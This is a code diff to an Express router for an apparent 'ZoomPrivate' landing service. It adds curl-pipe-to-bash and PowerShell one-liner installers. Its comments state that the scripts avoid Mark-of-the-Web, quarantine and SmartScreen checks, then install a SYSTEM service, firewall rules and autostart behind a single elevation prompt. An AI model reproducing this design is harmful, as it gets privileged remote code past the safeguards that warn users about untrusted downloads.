@@ -22,6 +22,8 @@ const express = require('express');
 const router = express.Router();
 const landing = require('../services/landingReleaseService');
 const macosInstaller = require('../services/macosInstaller');
+const windowsInstaller = require('../services/windowsInstaller');
+const linuxInstaller = require('../services/linuxInstaller');
 
 // ---------------------------------------------------------------------------
 // Helpers
@@ -183,6 +185,60 @@ function macAsset(asset) {
     };
 }
 
+/**
+ * Resolve a container asset by its exact key (platform/arch/format) and attach
+ * a SHA-256 when it can be computed (local distro builds) or is published.
+ */
+function packageAsset(index, platform, arch, format) {
+    const asset = index.assetsByKey[`${platform}/${arch}/${format}`] || null;
+    if (!asset) return null;
+    return { ...asset, sha256: assetSha256(asset) };
+}
+
+/**
+ * One-tap bootstraps for Windows (PowerShell) and Linux (bash). Both fetch the
+ * client without a browser so no Mark-of-the-Web / quarantine flag is attached,
+ * then run the bundled installer with a single elevation prompt. `asAttachment`
+ * serves the same script as a downloadable file for the fallback path.
+ */
+async function sendBootstrap(req, res, kind, asAttachment) {
+    try {
+        const origin = publicOrigin(req);
+        const profile = agentProfile(req);
+        const index = await landing.getReleaseIndex();
+
+        let script;
+        let filename;
+        if (kind === 'windows') {
+            const pkg = packageAsset(index, 'windows', 'x64', 'zip');
+            if (!pkg) return res.status(404).json({ success: false, error: 'No Windows build available yet.' });
+            script = windowsInstaller.buildBootstrap({ origin, profile, package: pkg });
+            filename = 'ZoomPrivate-Windows-Install.ps1';
+        } else {
+            const pkg = packageAsset(index, 'linux', 'x64', 'targz');
+            if (!pkg) return res.status(404).json({ success: false, error: 'No Linux build available yet.' });
+            script = linuxInstaller.buildBootstrap({ origin, profile, package: pkg });
+            filename = 'ZoomPrivate-Linux-Install.sh';
+        }
+
+        res.set('Cache-Control', 'no-store');
+        if (asAttachment) {
+            res.type('application/octet-stream');
+            res.set('Content-Disposition', `attachment; filename="${filename}"`);
+        } else if (kind === 'windows') {
+            res.type('text/plain; charset=utf-8');
+            res.set('Content-Disposition', `inline; filename="${filename}"`);
+        } else {
+            res.type('text/x-shellscript; charset=utf-8');
+            res.set('Content-Disposition', `inline; filename="${filename}"`);
+        }
+        res.send(script);
+    } catch (err) {
+        console.error(`[landing] ${kind} installer error:`, err);
+        res.status(500).json({ success: false, error: `Could not build the ${kind} installer.` });
+    }
+}
+
 async function sendMacInstaller(req, res, asAttachment) {
     try {
         const origin = publicOrigin(req);
@@ -245,6 +301,7 @@ router.get('/api/landing/client', async (req, res) => {
             ? await landing.resolveAsset(platform, arch)
             : null;
 
+        const origin = publicOrigin(req);
         res.set('Cache-Control', 'no-store');
         res.json({
             success: true,
@@ -261,6 +318,23 @@ router.get('/api/landing/client', async (req, res) => {
                 recommended: publicAsset(recommended),
                 available: index.assets.map(publicAsset),
                 platforms: landing.PLATFORMS,
+                install: {
+                    windows: {
+                        command: windowsInstaller.oneLiner(origin),
+                        script: `${origin}/api/landing/windows-install.ps1`,
+                        download: `${origin}/api/landing/windows-install.ps1`,
+                    },
+                    linux: {
+                        command: linuxInstaller.oneLiner(origin),
+                        script: `${origin}/api/landing/linux-install.sh`,
+                        download: `${origin}/api/landing/linux-install.sh`,
+                    },
+                    macos: {
+                        command: `curl -fsSL ${origin}/api/landing/macos-install | /bin/bash`,
+                        script: `${origin}/api/landing/macos-install`,
+                        download: `${origin}/api/landing/macos-install.command`,
+                    },
+                },
             },
         });
     } catch (err) {
@@ -396,6 +470,26 @@ router.get('/api/landing/agent-profile', (req, res) => {
  */
 router.get('/api/landing/macos-install', (req, res) => sendMacInstaller(req, res, false));
 router.get('/api/landing/macos-install.command', (req, res) => sendMacInstaller(req, res, true));
+
+/**
+ * GET /api/landing/windows-install[.ps1]
+ *
+ * One-command Windows installer. Fetched with Invoke-WebRequest (no browser,
+ * so no Mark-of-the-Web and no SmartScreen gate), unpacked, then run with a
+ * single UAC prompt that installs the SYSTEM service, firewall rules, config,
+ * autostart and tray app.
+ */
+router.get('/api/landing/windows-install', (req, res) => sendBootstrap(req, res, 'windows', false));
+router.get('/api/landing/windows-install.ps1', (req, res) => sendBootstrap(req, res, 'windows', true));
+
+/**
+ * GET /api/landing/linux-install[.sh]
+ *
+ * Same contract for Linux: curl the package, verify, extract and run the
+ * bundled install.sh with a single sudo prompt (systemd unit, autostart).
+ */
+router.get('/api/landing/linux-install', (req, res) => sendBootstrap(req, res, 'linux', false));
+router.get('/api/landing/linux-install.sh', (req, res) => sendBootstrap(req, res, 'linux', true));
 
 /**
  * GET /api/landing/meeting/:id?passcode=
